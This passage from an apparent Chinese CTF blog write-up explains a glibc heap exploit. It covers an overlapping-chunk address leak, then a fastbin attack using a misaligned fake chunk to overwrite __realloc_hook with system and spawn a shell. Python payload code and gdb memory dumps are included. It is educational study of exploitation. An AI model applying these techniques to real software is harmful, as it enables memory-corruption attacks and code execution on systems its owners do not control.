<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x562a3c9a8070-0x70</span><br><span class="line">0x562a3c9a8000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x562a3c9a8010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x562a3c9a8020:	0x0000562a3c9a80b0	0x0000000000000000</span><br><span class="line">0x562a3c9a8030:	0x0000000000000000	0x0000562a3c9a8140</span><br><span class="line">0x562a3c9a8040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x562a3c9a8060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x562a3c9a8070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x562a3c9a8080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x562a3c9a8090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x562a3c9a80a0:	0x0000000000000000	0x0000000000000301 <span class="comment">#free后合并的chunk</span></span><br><span class="line">0x562a3c9a80b0:	0x00007f14e88247b8	0x00007f14e88247b8</span><br><span class="line">0x562a3c9a80c0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80d0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80e0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a80f0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8100:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8110:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8120:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x562a3c9a8130:	0x0000000000000090	0x0000000000000040 <span class="comment">#堆块2</span></span><br><span class="line">0x562a3c9a8140:	0x0000562a3c9a8070	0x0000000000000018</span><br><span class="line">0x562a3c9a8150:	0x0000562a3c9a8050	0x0000000000000000</span><br><span class="line">0x562a3c9a8160:	0x0000000000000000	0x0000562a3c9a8250</span><br><span class="line">0x562a3c9a8170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x562a3c9a8180:	0x0000562a3c9a8000	0x00000000000000f0</span><br></pre></td></tr></table></figure>
<ol>
<li>为什么确定这里是堆块2，你可以看他的key指针，指向0x0000562a3c9a8070，这里正是0x32就是第二块</li>
<li>如果我们要泄露的话，就是通过覆盖堆块的数据部分的大小，也就是0x18那个大小，覆盖成0x562a3c9a80b0处存的地址，我们要将这个内容往下偏移多少要计算下</li>
<li>0x562a3c9a8140-0x562a3c9a80b0=0x90</li>
<li>所以我们下一个malloc的大小就是0x80-0x90之间了,不能是0x90，否则会变成0x100的chunk</li>
</ol>
<p>覆盖后结果如下，地址会变，因为我是两次调试，方便截图，实际偏移位置没变</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x55be33916070-0x70</span><br><span class="line">0x55be33916000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x55be33916010:	0x0000000000000000	0x0000000000000080</span><br><span class="line">0x55be33916020:	0x000055be339160b0	0x0000000000000000</span><br><span class="line">0x55be33916030:	0x0000000000000000	0x000055be33916140</span><br><span class="line">0x55be33916040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x55be33916060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x55be33916070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x55be33916080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x55be33916090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x55be339160b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be339160f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x55be33916130:	0x0000000000000000	0x0000000000000271</span><br><span class="line">0x55be33916140:	0x00007fa9f416c7b8	0x00007fa9f416c7b8 <span class="comment">#覆盖了原来的0x18</span></span><br><span class="line">0x55be33916150:	0x000055be33916050	0x0000000000000000</span><br><span class="line">0x55be33916160:	0x0000000000000000	0x000055be33916250</span><br><span class="line">0x55be33916170:	0x0000000000000001	0x0000000000000041</span><br><span class="line">0x55be33916180:	0x000055be339163e0	0x0000000000000088</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190829213254-81676342-ca61-1.png" alt="leak" title="leak"></p>
<h4 id="保护现场"><a href="#保护现场" class="headerlink" title="保护现场"></a>保护现场</h4><p>这步是比较难的，因为堆块申请的位置不确定，需要一步步调试确定，我建议每部署一部分，调试一次状况，然后在进行现场的保护</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(heap_base+<span class="number">0x70</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3e0</span>)</span><br><span class="line">payload += p64(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0xb0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(realloc_hook_addr<span class="number">-0x8</span><span class="number">-0x3</span><span class="number">-0x8</span>)</span><br><span class="line">PUT(<span class="string">"6"</span>*<span class="number">0x8</span>, <span class="number">0xa8</span>, payload)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x290</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"c"</span>*<span class="number">0x8</span>, <span class="number">0x78</span>, payload)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">payload += p64(heap_base+<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)+p64(heap_base+<span class="number">0x230</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x250</span>)</span><br><span class="line">payload += p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">PUT(<span class="string">"d"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure>
<p>具体我怎么调试示范下，先在1处gdb.attach(p)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/100gx 0x559717162000</span><br><span class="line">0x559717162000:	0x0000000000000000	0x0000000000000041 <span class="comment">#结构体chunk</span></span><br><span class="line">0x559717162010:	0x00005597171621c0	0x00000000000000a8</span><br><span class="line">0x559717162020:	0x0000559717162140	0x0000000000000000</span><br><span class="line">0x559717162030:	0x0000000000000000	0x0000559717162140</span><br><span class="line">0x559717162040:	0x0000000000000001	0x0000000000000021</span><br><span class="line">0x559717162050:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x559717162060:	0x4242424242424242	0x0000000000000021</span><br><span class="line">0x559717162070:	0x3232323232323232	0x0000000000000000</span><br><span class="line">0x559717162080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620a0:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5597171620b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171620f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x559717162130:	0x0000000000000000	0x00000000000000b1 <span class="comment">#payload chunk </span></span><br><span class="line">0x559717162140:	0x0000559717162070	0x0000000000000008</span><br><span class="line">0x559717162150:	0x0000559717162050	0x0000559717162010</span><br><span class="line">0x559717162160:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x559717162170:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162180:	0x00005597171623e0	0x0000000000000088</span><br><span class="line">0x559717162190:	0x00005597171620b0	0x0000000000000000</span><br><span class="line">0x5597171621a0:	0x0000000000000000	0x0000559717162250</span><br><span class="line">0x5597171621b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5597171621d0:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5597171621e0:	0x00007fc9194dc71d	0x00000000000001c1 <span class="comment">#payload end</span></span><br><span class="line">0x5597171621f0:	0x00007fc9194dc7b8	0x00007fc9194dc7b8</span><br><span class="line">0x559717162200:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162210:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162220:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162230:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162240:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x559717162250:	0x0000559717162290	0x0000000000000020</span><br><span class="line">0x559717162260:	0x00005597171623b0	0x0000559717162140</span><br><span class="line">0x559717162270:	0x0000559717162180	0x0000000000000000</span><br><span class="line">0x559717162280:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559717162290:	0x3434343434343434	0x0000000000000000</span><br><span class="line">0x5597171622a0:	0x0000000000000200	0x0000000000000100</span><br><span class="line">0x5597171622b0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622c0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622d0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622e0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x5597171622f0:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162300:	0x4343434343434343	0x4343434343434343</span><br><span class="line">0x559717162310:	0x4343434343434343	0x4343434343434343</span><br></pre></td></tr></table></figure>
<p>既然知道他会覆盖那部分，我就提前查看这部分内容，进行覆盖就行了，然后将gdb.attach放到合并堆块那会，查看具体内容，也就是在这</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p)</span><br><span class="line">PUT(<span class="string">"a"</span>, <span class="number">0x88</span>, p8(<span class="number">0</span>)*<span class="number">0x88</span>)</span><br><span class="line">DUMP()</span><br></pre></td></tr></table></figure>
<p>查看具体内容，然后进行覆盖</p>
<ol>
<li><p>我上面所说的这是土方法，我测试出来的。</p>
</li>
<li><p>其实这些都可以预估的，前面DEL(1) DEL(3),所以会空闲两个结构体，这是fastbin部分的空闲堆块，所以结构体会在原来的chunk上建立，至于申请的0xa8不属于fastbin里，所以他会从大堆块里取，取出能存放0xa8大小的chunk，第二次put的话先申请一个结构体0x40大小的结构体存放红黑树结构，然后在申请0x78大小的chunk，都是从大堆块里取，因为此时fastbin里没有空闲堆块了，第一块用于PUT(“a”, 0x88, p8(0)<em>0x88),第二块用于PUT(“6”</em>0x8, 0xa8, payload)</p>
</li>
<li><p>PUT(“d”*0x8, 0x60, payload)这里先申请一个堆块，同时保护现场，因为原来是fastbin中的一个chunk指向了realloc_hook，现在申请过后，在申请一个堆块便是realloc_hook的地址了</p>
</li>
</ol>
<p>注意：还记得开头申请两个3吗，申请第二个3的时候会先删除前一个chunk，那个就是fastbin里0x70大小的chunk，所以我们覆盖的就是这个chunk的fd</p>
<h4 id="覆写realloc-hook"><a href="#覆写realloc-hook" class="headerlink" title="覆写realloc_hook"></a>覆写realloc_hook</h4><p>还记得我前面realloc_hook地址怎么写payload的吗<br>看<br>realloc_hook_addr-0x8-0x3-0x8<br>为什么要这么写呢？<br>先看看realloc_hook附近</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>你记得malloc_chunk是怎么样的吗？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>如果我们要申请个chunk的话，应当如何，不伪造chunk可不可以，我尝试过，失败了，<br>我报了这个错<br><strong>malloc(): memory corruption (fast)</strong><br>经师傅提点，去查看malloc源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())) &#123;</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的下标</span></span><br><span class="line">    idx             = fastbin_index(nb);</span><br><span class="line">    <span class="comment">// 得到对应的fastbin的头指针</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr    pp = *fb;</span><br><span class="line">    <span class="comment">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        victim = pp;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,</span><br><span class="line">                                                        victim)) != victim);</span><br><span class="line">    <span class="comment">// 存在可以利用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">        <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">        <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">        errout:</span><br><span class="line">            malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 细致的检查。。只有在 DEBUG 的时候有用</span></span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">// 将获取的到chunk转换为mem模式</span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">        <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他会检测大小是否正确，所以不伪造chunk的size部分过不了关的<br>在回到这里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10</span><br><span class="line">0x7f14d2670720 &lt;__memalign_hook&gt;:	0x00007f14d2335c90	0x0000000000000000</span><br><span class="line">0x7f14d2670730 &lt;__realloc_hook&gt;:	0x00007f14d2335c30	0x0000000000000000</span><br><span class="line">0x7f14d2670740 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这样是个chunk的话，pre_size是0x00007f14d2335c90，size是0，这样肯定没法搞，所以我们要利用一点错位，让size成功变成fastbin里的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5gx 0x7f14d2670730-0x10-0x3</span><br><span class="line">0x7f14d267071d:	0x14d2335c90000000	0x000000000000007f</span><br><span class="line">0x7f14d267072d:	0x14d2335c30000000	0x000000000000007f</span><br><span class="line">0x7f14d267073d:	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>这样不就成了，size为0x7f，然后我们现在大小对了，位置错位了，所以最后我们要补个’a’*0x3来填充我们的错位部分，然后在realloc部分填上我们的system地址，最后在调用一次getshell</p>
<p>这里的错位需要自己调试，不一定是跟我一样的错位，在fastbin attack部分也将会学习到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system_addr = libc_base+system_off</span><br><span class="line">print(<span class="string">"system_addr: 0x%x"</span> % system_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x3</span></span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p8(<span class="number">0</span>)*(<span class="number">0x4d</span>+<span class="number">0x8</span>)</span><br><span class="line">PUT(<span class="string">"e"</span>*<span class="number">0x8</span>, <span class="number">0x60</span>, payload)</span><br><span class="line">payload = <span class="string">"/bin/sh"</span></span><br><span class="line">payload += p8(<span class="number">0</span>)*<span class="number">0x12</span> </span><br><span class="line">GET(payload)</span><br></pre></td></tr></table></figure>

<p>到了结尾了，这里有个点说明下，我们malloc(0x7f)跟伪造chunk的size是完全不一样的，我们malloc过后还要经过计算才得到size，你看普通malloc(0x7f)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x557c81b53130:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x557c81b53140:	0x0000557c81b53070	0x000000000000007f</span><br><span class="line">0x557c81b53150:	0x0000557c81b53180	0x0000557c81b53010</span><br><span class="line">0x557c81b53160:	0x0000557c81b53210	0x0000000000000000</span><br><span class="line">0x557c81b53170:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x557c81b53180:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b53190:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531a0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531b0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531c0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531d0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531e0:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x557c81b531f0:	0x4242424242424242	0x0042424242424242</span><br></pre></td></tr></table></figure>
<p>他获得的是0x91大小的chunk，具体size计算可以自己看源码，我只是点出这个点而已</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>这道题知识点较多，利用较复杂，利用堆块重叠泄露，在用fastbin attack</li>
<li>错位伪造chunk知识点，补上了，第一次遇到</li>
<li>这道题需要对堆的分配机制较为熟练才比较好做，像我调试了很久，最终才的出来的结论</li>
<li>遇到错误要学会去查看源码，好几个师傅都叫我看源码，最后才懂的</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-246966.htm" target="_blank" rel="noopener">看雪的师傅的文章</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/" target="_blank" rel="noopener">ctf-wiki原理介绍</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/10/30/pwn/pwn-heap-learn-8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/30/pwn/pwn-heap-learn-8/" itemprop="url">pwn/pwn-heap-learn-8</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T09:11:25+08:00">
                2019-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
